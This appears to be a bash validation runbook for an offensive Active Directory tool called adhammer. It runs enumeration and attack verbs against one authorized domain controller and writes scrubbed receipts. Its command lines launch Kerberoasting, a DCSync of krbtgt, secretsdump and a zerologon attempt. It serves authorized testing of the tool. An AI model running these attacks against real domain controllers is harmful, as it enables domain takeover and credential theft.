#!/usr/bin/env bash
# ADhammer live-validation runbook — Phase 4 of the 1.4.9 100/100 plan.
#
# What it does: runs a defined set of adhammer verbs against ONE
# authorized DC, captures stdout/stderr to a temp file, feeds the
# temp file through scripts/scrub_receipt.py to strip every lab-
# identifying value (IP, SID, password, DC hostname), then writes the
# sanitized receipt to docs/receipts/<version>__<windows_label>.md.
#
# The receipt is committable — no lab identifiers leak. The workflow
# produces both a machine-readable JSON summary and a human-readable
# Markdown block per verb.
#
# What it does NOT do: destructive verbs (dcshadow --push, abuse writes,
# poison / relay listeners, coerce senders). Those are the operator's
# call, from an interactive session. This runbook only exercises the
# supported-tier read + validated-attack paths.
#
# Usage:
#     ADH_DC=192.168.10.20            # DC IP (never committed to receipts)
#     ADH_REALM=CORP.LOCAL             # AD realm
#     ADH_ADMIN='CORP\Administrator'   # admin identity
#     ADH_PW='env:ADH_PW_VALUE'        # password via env indirection
#     export ADH_PW_VALUE='...'        # the actual value; never appears
#                                      # anywhere but this env var
#     WINDOWS_LABEL=2019               # release-cycle label for the receipt
#     ./scripts/live_validation.sh
#
# Output: docs/receipts/1.4.9__2019.md  (readable), .json (machine).
#
# Requirements: bash, adhammer binary built (./target/release/adhammer),
# python3 for the scrubber, timeout, sha256sum.

set -euo pipefail
umask 077

# ---- Sanity ----
: "${ADH_DC:?set ADH_DC to the target DC IP}"
: "${ADH_REALM:?set ADH_REALM to the AD realm (e.g. CORP.LOCAL)}"
: "${ADH_ADMIN:?set ADH_ADMIN to DOMAIN\\User}"
: "${ADH_PW:?set ADH_PW=env:VAR + export VAR — never inline}"
: "${WINDOWS_LABEL:?set WINDOWS_LABEL to the DC OS tag (2019|2022|2025)}"
: "${EXPECTED_BINARY_SHA256:?set EXPECTED_BINARY_SHA256 to the candidate artifact digest}"

if [[ ! "$ADH_PW" =~ ^env:([A-Za-z_][A-Za-z0-9_]*)$ ]]; then
    echo "[!] ADH_PW must be an env:VAR reference; literal credentials are refused" >&2
    exit 2
fi
PW_ENV_NAME=${BASH_REMATCH[1]}
if [[ -z "${!PW_ENV_NAME+x}" || -z "${!PW_ENV_NAME}" ]]; then
    echo "[!] credential environment variable $PW_ENV_NAME is not set or is empty" >&2
    exit 2
fi
case "$WINDOWS_LABEL" in
    2019|2022|2025) ;;
    *)
        echo "[!] WINDOWS_LABEL must be one of: 2019, 2022, 2025" >&2
        exit 2
        ;;
esac

ROOT=$(git rev-parse --show-toplevel)
cd "$ROOT"

ADHAMMER=${ADHAMMER:-"./target/release/adhammer"}
if [ ! -x "$ADHAMMER" ]; then
    echo "[!] $ADHAMMER not found — run: cargo build --release --bin adhammer"
    exit 2
fi

VERSION=$(python3 -c 'import tomllib; print(tomllib.load(open("Cargo.toml", "rb"))["workspace"]["package"]["version"])')
RECEIPTS_DIR="$ROOT/docs/receipts"
mkdir -p "$RECEIPTS_DIR"

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT
RAW="$WORK/raw.jsonl"
MD_OUT="$RECEIPTS_DIR/${VERSION}__${WINDOWS_LABEL}.md"
JSON_OUT="$RECEIPTS_DIR/${VERSION}__${WINDOWS_LABEL}.json"
MD_TMP="$WORK/receipt.md"
JSON_TMP="$WORK/receipt.json"
BINARY_SHA=$(sha256sum "$ADHAMMER" | awk '{print $1}')
REPORTED_VERSION=$("$ADHAMMER" --version | tr -d '\r' | awk '{print $NF}')
if [ "$REPORTED_VERSION" != "$VERSION" ]; then
    echo "[!] binary reports $REPORTED_VERSION but workspace release is $VERSION" >&2
    exit 2
fi
if [[ ! "$EXPECTED_BINARY_SHA256" =~ ^[0-9a-fA-F]{64}$ ]] || \
    [ "${EXPECTED_BINARY_SHA256,,}" != "${BINARY_SHA,,}" ]; then
    echo "[!] binary digest does not match EXPECTED_BINARY_SHA256" >&2
    exit 2
fi

echo "[+] adhammer $VERSION  → live-validation vs Windows $WINDOWS_LABEL"
echo "[+] raw output collected in $RAW (scrubbed before commit)"
echo "[+] receipt will be written to $(basename "$MD_OUT") + .json"
echo

# ---- Run each verb, capture ----
: > "$RAW"
declare -a RESULTS=()

run_verb() {
    local name=$1
    shift
    echo "[>] $name"
    local start status rc elapsed
    start=$(date +%s)
    if timeout 120 "$ADHAMMER" "$@" > "$WORK/${name}.out" 2>&1; then
        status="pass"
    else
        rc=$?
        if [ "$rc" -eq 124 ]; then
            status="timeout"
        else
            status="fail (rc=$rc)"
        fi
    fi
    elapsed=$(( $(date +%s) - start ))
    # Redact secrets THEN append.
    python3 scripts/scrub_receipt.py "$WORK/${name}.out" \
        --dc "$ADH_DC" --realm "$ADH_REALM" --admin "$ADH_ADMIN" \
        --pw-env "$PW_ENV_NAME" \
        > "$WORK/${name}.scrubbed"
    printf '{"verb":"%s","status":"%s","elapsed_s":%s,"receipt_lines":%s}\n' \
        "$name" "$status" "$elapsed" "$(wc -l < "$WORK/${name}.scrubbed")" >> "$RAW"
    RESULTS+=("$name|$status|$elapsed")
}

run_verb scan scan --url "ldaps://${ADH_DC}:636" --user "$ADH_ADMIN" --password "$ADH_PW" --insecure --json
run_verb enum_samr enum samr --host "$ADH_DC" --domain "${ADH_REALM%%.*}" --user "${ADH_ADMIN##*\\}" --password "$ADH_PW"
run_verb enum_lsa enum lsa --host "$ADH_DC" --domain "${ADH_REALM%%.*}" --user "${ADH_ADMIN##*\\}" --password "$ADH_PW"
run_verb enum_krb_users enum krb-users --realm "$ADH_REALM" --kdc "$ADH_DC" --user "${ADH_ADMIN##*\\}"
run_verb enum_posture enum posture --host "$ADH_DC" --domain "${ADH_REALM%%.*}" --user "${ADH_ADMIN##*\\}" --password "$ADH_PW"
run_verb enum_adcs enum adcs --url "ldaps://${ADH_DC}:636" --user "$ADH_ADMIN" --password "$ADH_PW" --insecure
run_verb attack_roast attack roast --url "ldaps://${ADH_DC}:636" --user "$ADH_ADMIN" --password "$ADH_PW" --insecure --kdc "$ADH_DC"
run_verb attack_dcsync_krbtgt attack dcsync --host "$ADH_DC" --domain "${ADH_REALM%%.*}" --user "${ADH_ADMIN##*\\}" --password "$ADH_PW" --target krbtgt
run_verb attack_secretsdump attack secretsdump --host "$ADH_DC" --domain "${ADH_REALM%%.*}" --user "${ADH_ADMIN##*\\}" --password "$ADH_PW"
run_verb attack_zerologon attack zerologon --host "$ADH_DC" --domain "${ADH_REALM%%.*}"

# ---- Assemble Markdown receipt ----
{
    echo "# Live-validation receipt — adhammer ${VERSION} vs Windows ${WINDOWS_LABEL}"
    echo
    echo "Run date: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
    echo "Binary sha256: $BINARY_SHA"
    echo "Review status: pending"
    echo
    echo "**Ledger promotion:** every 'pass' row below is eligible to move the"
    echo "corresponding docs/VALIDATION.md row from 'validation owed' to"
    echo "'supported' if it isn't already. Verify manually + commit the ledger"
    echo "change alongside this receipt."
    echo
    echo "Automated scrubbing covered declared DC/realm/admin/password values,"
    echo "domain SIDs, IPv4 addresses, denylisted patterns, and secret-shaped"
    echo "hex. Manual review is mandatory before changing status to approved."
    echo
    echo "## Summary"
    echo
    echo "| Verb | Status | Elapsed |"
    echo "|---|---|---|"
    for r in "${RESULTS[@]}"; do
        IFS='|' read -r name status elapsed <<<"$r"
        echo "| \`$name\` | $status | ${elapsed}s |"
    done
    echo
    echo "## Per-verb output"
    echo
    for r in "${RESULTS[@]}"; do
        IFS='|' read -r name status elapsed <<<"$r"
        echo "### $name — $status"
        echo
        # Indented Markdown is a code block even if hostile output contains
        # backticks or HTML, so captured target data cannot inject markup.
        sed -n '1,80{s/^/    /;p}' "$WORK/${name}.scrubbed"
        echo
    done
} > "$MD_TMP"

# ---- JSON summary ----
python3 - "$RAW" "$VERSION" "$WINDOWS_LABEL" "$BINARY_SHA" > "$JSON_TMP" <<'PY'
import json
import sys

raw_path, version, windows_label, binary_sha256 = sys.argv[1:]
with open(raw_path, encoding="utf-8") as source:
    rows = [json.loads(line) for line in source if line.strip()]
out = {
    "version": version,
    "windows_label": windows_label,
    "binary_sha256": binary_sha256,
    "review_status": "pending",
    "verbs": rows,
}
print(json.dumps(out, indent=2))
PY
python3 -m json.tool "$JSON_TMP" > /dev/null

# Publish only after both sanitized artifacts have been built and validated.
mv -f "$MD_TMP" "$MD_OUT"
mv -f "$JSON_TMP" "$JSON_OUT"
chmod 0644 "$MD_OUT" "$JSON_OUT"

echo
echo "[+] Wrote $MD_OUT + $JSON_OUT"
echo "[+] Review with:  git diff docs/receipts/"
echo "[+] Commit with:  git add docs/receipts/ && git commit -m 'validation: adhammer $VERSION receipt vs $WINDOWS_LABEL'"
